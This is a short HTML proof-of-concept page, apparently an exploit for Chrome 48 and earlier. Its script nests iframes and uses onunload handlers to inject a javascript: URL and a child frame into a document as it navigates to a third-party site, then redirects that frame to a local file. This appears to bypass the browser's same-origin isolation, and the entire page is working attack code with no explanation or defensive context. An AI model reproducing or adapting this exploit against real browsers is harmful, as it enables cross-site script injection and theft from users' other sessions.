<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=GBK">
    <title>
        Chrome 48及以前的版本能重现
    </title>
    <script>
        var x;
        var i = document.createElement('iframe');
        document.documentElement.appendChild(i);
        console.log("start:",i.src);
        i.contentWindow.onunload = function () {
            console.log("i.onunload",i.src);
            //return;
            i.src = "javascript:''";
            var d = i.contentDocument;
            var i0 = d.createElement('iframe');
            d.body.appendChild(i0);
            i0.contentWindow.onunload = function () {
                console.log("i0.onunload");
                x = d.createElement('iframe');
                d.body.appendChild(x);
            }
        }

        i.onload = function () {
            console.log("i.onload",i.src);
            //return;
            if (!x) {
                return
            }
            x.contentWindow.location.href = 'f.html';
        }
        console.log("will set i.src = uc123",i.src);
        i.src = 'http://www.uc123.com';
    </script>

</html>